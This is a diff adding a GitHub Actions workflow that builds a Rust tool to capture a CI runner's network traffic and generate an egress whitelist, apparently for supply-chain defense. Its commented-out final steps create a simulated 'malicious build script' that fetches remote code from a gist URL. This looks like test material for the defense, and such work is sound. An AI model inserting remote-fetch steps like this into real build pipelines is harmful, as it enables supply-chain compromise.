@@ -1,0 +1,75 @@
+name: Test of the project
+
+on:
+  pull_request:
+    branches: ["*"]
+
+jobs:
+  create_whitelist:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Install Rust toolchain
+        uses: dtolnay/rust-toolchain@nightly
+
+      - name: Run the binary to create the whitelist
+        run: cargo run --release create-whitelist 120 --file runner-ubuntu-whitelist.json
+
+      - name: 📦 Checkout code
+        uses: actions/checkout@v3
+
+      - name: 🐍 Setup Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: "3.10"
+
+      - name: 🔧 Install Python deps
+        run: |
+          pip install requests
+
+      - name: ⚙️ Build your release binary
+        run: |
+          cargo build --release
+
+      - name: 🎯 Generate the custom whitelist
+        run: |
+          # 1) Launch your `create-whitelist` listener in the background for 120 s
+          nohup cargo run --release create-whitelist 120 \
+            --file runner-ubuntu-whitelist.json \
+            > whitelist.log 2>&1 &
+
+          # 2) Give the listener a moment to bind its socket
+          sleep 5
+
+          # 3) Run your “legitimate” build to produce baseline traffic
+          python build.py
+
+          # 4) Allow the rest of the 120 s capture window to elapse
+          echo "Waiting for listener to finish capturing (up to 120 s total)…"
+          sleep 120
+
+          # 5) Wait for the background process to exit cleanly
+          wait
+
+      - name: 📄 Show generated whitelist
+        run: cat runner-ubuntu-whitelist.json
+
+      # - name: 🐍 Create malicious build script
+      #   run: |
+      #     cat > build_malicious.py << 'EOF'
+      #     import subprocess, sys, requests
+
+      #     print(f"Python version: {sys.version}")
+      #     print("Attempting to fetch malicious payload from gist.githubusercontent.com…")
+      #     resp = requests.get(
+      #       "https://gist.githubusercontent.com/gewashington/a4d0211e6f8601b69ff74e30d9e3ca20/raw/9d3e37cf7742b41e39606e70aab7a4f971353749/practice-python-fibonnaci.py"
+      #     )
+      #     print(f"Got {resp.status_code}")
+      #     subprocess.run(["pip", "list"])
+      #     print("Build (malicious) completed!")
+      #     EOF
+
+      # - name: 🏴‍☠️ Run malicious build script
+      #   run: python build_malicious.py
